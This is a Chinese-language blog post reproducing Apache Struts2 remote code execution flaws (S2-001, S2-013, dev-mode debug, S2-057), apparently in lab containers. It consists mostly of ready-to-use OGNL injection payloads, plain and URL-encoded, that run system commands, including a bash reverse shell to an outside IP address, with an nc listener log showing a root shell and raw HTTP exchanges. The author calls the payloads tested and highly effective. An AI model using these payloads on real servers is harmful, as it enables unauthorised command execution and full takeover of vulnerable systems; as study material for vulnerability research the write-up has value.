---
title:      "「Struts2」:Apache-Struts2框架漏洞复现"
author:     "Bin4xin"
catalog: true

article_header:
  type: cover
  image:
    src: img/post-bg/post-houheixue-pic-bg.png
tags:
    - 笔记
    - vulnhub
    - 漏洞复现
    - CVE

---


# s2-001
struts2-001该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用`OGNL表达式%{value}`进行解析，然后重新填充到对应的表单数据中。
例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 `%{value}` 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。

> 影响版本：Struts 2.0.0 - Struts 2.0.8

### payload代码
```bash
%25{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```
发送回包回显如下：payload的注入命令`whoami`下方页面显示回显`root`，执行成功。
```bash
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>S2-001</title>
</head>
<body>
<h2>S2-001 Demo</h2>
<p>link: <a href="https://struts.apache.org/docs/s2-001.html">https://struts.apache.org/docs/s2-001.html</a></p>

			
<form id="login" name="login" onsubmit="return true;" action="/login.action" method="post">
<table class="wwFormTable">
	<tr>
    <td class="tdLabel"><label for="login_username" class="label">username:</label></td>
    <td
><input type="text" name="username" value="asdadas" id="login_username"/>
</td>
</tr>
root
```
payload1:
```bash
%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22whoami%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
```
payload2(get shell):
```bash
%25{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"ping","dnslog.cn"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

%25{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash","-c","/bin/bash -i >& /dev/tcp/47.52.233.92/12341 0>& 1"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

--------------------+
--------------------+
以下是使用payload，实测能够十分有效的进行各种poc代码注入，使用url编码效果更佳。
%25{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash","-c","/bin/bash -i >& /dev/tcp/47.52.233.92/12341 0>& 1"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```
```bash
nc -lvnp 12341
Listening on 0.0.0.0 12341
Connection received on 120.242.209.224 17321
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@9485ca31e963:/usr/local/tomcat# id
uid=0(root) gid=0(root) groups=0(root)
```

# s2-013
```bash
?url=%24%7B%28%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23out.println%28%23d%29%2C%23out.close%28%29%29%7D
```



# struts2-dev-mode

```bash
debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
```




# s2-057

> 影响版本: <= Struts 2.3.34, Struts 2.5.16

访问`http://localhost:8080/${(111+111)}/actionChain1.action`

```bash
Requst包
GET /$%7B(111+111)%7D/actionChain1.action HTTP/1.1
Host: vuln_s2_ip:8080
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, 
  like Gecko) Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/ap
ng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=6567848243F5C10BA42DA6C8222FFC32
Connection: close
+------------------------++------------------------++------------------------+
+------------------------++------------------------++------------------------+

Response包：
HTTP/1.1 302 
Location: /222/register2.action
Content-Length: 0
Date: Wed, 27 May 2020 06:21:06 GMT
Connection: close

```
我们看到`${(111+111)}`表达式已经被计算
